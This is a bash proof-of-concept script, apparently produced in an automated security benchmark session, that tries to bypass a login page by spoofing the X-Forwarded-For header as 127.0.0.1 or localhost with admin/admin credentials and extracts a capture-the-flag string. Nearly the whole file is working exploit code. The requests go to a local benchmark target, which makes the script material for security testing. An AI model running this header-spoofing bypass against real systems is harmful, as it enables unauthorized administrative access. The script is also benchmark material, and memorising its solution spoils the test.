#!/bin/bash
# POC: Demonstrates authentication bypass via X-Forwarded-For header manipulation. Tests bypassing login by setting X-Forwarded-For to localhost identifiers.
# Target: ./repo
# Created: 2025-11-07T22:08:47.133Z
# Session: benchmark-XBEN-085-24-mhpe4t6x

# Authentication Bypass via X-Forwarded-For Header POC
# This script demonstrates how an attacker can bypass authentication by
# manipulating the X-Forwarded-For HTTP header to spoof a localhost request

TARGET_URL="http://localhost"
ADMIN_USERNAME="admin"
ADMIN_PASSWORD="admin"

echo "=========================================="
echo "X-Forwarded-For Authentication Bypass POC"
echo "=========================================="
echo ""

# Test 1: Login with X-Forwarded-For: 127.0.0.1
echo "[*] Test 1: Login with X-Forwarded-For: 127.0.0.1"
RESPONSE1=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d "username=$ADMIN_USERNAME&password=$ADMIN_PASSWORD")

if echo "$RESPONSE1" | grep -q "Welcome Admin"; then
  echo "[✓] VULNERABLE - Authentication bypassed with 127.0.0.1"
  echo "[+] Response contains: Welcome Admin"
  if echo "$RESPONSE1" | grep -q "FLAG{"; then
    FLAG=$(echo "$RESPONSE1" | grep -oP 'FLAG{\K[^}]+' | head -1)
    echo "[+] Flag captured: FLAG{$FLAG}"
  fi
else
  echo "[-] Not vulnerable with 127.0.0.1"
  echo "[!] Response: $(echo "$RESPONSE1" | head -c 200)"
fi
echo ""

# Test 2: Login with X-Forwarded-For: localhost
echo "[*] Test 2: Login with X-Forwarded-For: localhost"
RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: localhost" \
  -d "username=$ADMIN_USERNAME&password=$ADMIN_PASSWORD")

if echo "$RESPONSE2" | grep -q "Welcome Admin"; then
  echo "[✓] VULNERABLE - Authentication bypassed with localhost"
  echo "[+] Response contains: Welcome Admin"
else
  echo "[-] Not vulnerable with localhost"
fi
echo ""

# Test 3: Login without X-Forwarded-For (baseline - should fail)
echo "[*] Test 3: Login without X-Forwarded-For (baseline)"
RESPONSE3=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$ADMIN_USERNAME&password=$ADMIN_PASSWORD")

if echo "$RESPONSE3" | grep -q "Access Restricted"; then
  echo "[✓] Baseline confirmed - Normal request rejected with 'Access Restricted'"
else
  echo "[!] Baseline unclear"
  echo "[!] Response: $(echo "$RESPONSE3" | head -c 200)"
fi
echo ""

# Test 4: Login with external IP (should fail)
echo "[*] Test 4: Login with X-Forwarded-For: 192.168.1.1 (external IP - should fail)"
RESPONSE4=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: 192.168.1.1" \
  -d "username=$ADMIN_USERNAME&password=$ADMIN_PASSWORD")

if echo "$RESPONSE4" | grep -q "Access Restricted"; then
  echo "[✓] Correctly rejected external IP"
else
  echo "[!] Unexpected response"
fi
echo ""

# Test 5: Case-insensitive test with lowercase x-forwarded-for
echo "[*] Test 5: Case-insensitive header (lowercase x-forwarded-for)"
RESPONSE5=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "x-forwarded-for: 127.0.0.1" \
  -d "username=$ADMIN_USERNAME&password=$ADMIN_PASSWORD")

if echo "$RESPONSE5" | grep -q "Welcome Admin"; then
  echo "[✓] VULNERABLE - Case-insensitive header works"
else
  echo "[-] Case-insensitive header failed"
fi
echo ""

echo "=========================================="
echo "POC Complete"
echo "=========================================="